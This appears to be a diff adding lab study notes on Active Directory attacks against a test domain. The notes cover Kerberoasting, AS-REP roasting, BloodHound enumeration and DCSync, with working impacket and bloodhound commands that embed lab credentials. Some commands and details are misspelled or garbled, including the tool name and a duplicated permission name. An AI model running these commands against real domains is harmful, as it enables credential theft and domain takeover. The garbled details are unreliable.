@@ -1,0 +1,73 @@
+tshoot.com is the domain
+spiderone is normal account has the password passwOrd
+spidertwo another user IDK the password
+DC ip is 192.168.64.147
+
+
+
+	{{{{{ kerberoasting }}}}}
+
+in the past kerberoasting attack when we attacked IIS server account, we used our win 10 machine witch already member of the domain, now we will use our kali machine (which is just in the same network with the server) to perform the attack, using impacket to get SPNs and the SPNs hash:
+
+	cd /opt/impacket/examples
+
+	python3 GetUserSPNs.py tshoot.com/spiderone:passwOrd -dc-ip 192.168.64.147 -request
+
+then we crack the hash with JTR or hashcat.
+
+
+===================================================================================================================
+
+	{{{{{ AS-REP Roasting Attack }}}}}
+
+the idea of the attack that if the kerberos pre-auth is disapled on any account then i can request TGT for that account and crack the his hash, using kali with the same roles above:
+
+	cd /opt/impacket/examples
+
+	python3 GetNPUsers.py tshoot.com/spidertwo -dc-ip 192.168.64.147
+
+then we crack the user's hash with JTR or hashcat.
+
+!note : somtimes the script can run without username.
+
+
+even if the kreberos pre-auth is'nt disapled  we can easily use WIRESHARK with kerberos filter to sniff the AS-REP and crack the hash.
+
+
+===================================================================================================================
+
+	{{{{{ control DC using bloodhound }}}}}
+	
+first we need any account registered on the domain controller, using kali we write:
+
+	pip3 install bloodhound
+	
+	bloodhound-python -u spiderone -p passwOrd -ns 192.168.64.147 -d tshoot.com -c All  ----> that will dump all data and generate four JSON files 
+
+the we open bloodhound and upload these JSON files, then use it to create queries and we will apply them on our win10 machine to control DC:
+		
+	bloodhound
+
+!note: when we install bloodhound we will face a MAX 1024 problem and we can solve it by writing : "ulmiit -n 100000"
+
+
+===================================================================================================================
+
+
+	{{{{{ DC Sync Attack }}}}}
+
+we can ask for all the hashes as the past attack was but this time we will do it with kali linux, spiderone should have two permissions "Replicating Directory Changes" and "Replicating Directory Changes" :
+
+	python3 sercretdump.py tshoot.com/spiderone:passwOrd@192.168.64.147 -use-vss
+
+
+==================================================================================================================
+
+
+
+
+
+
+
+
+
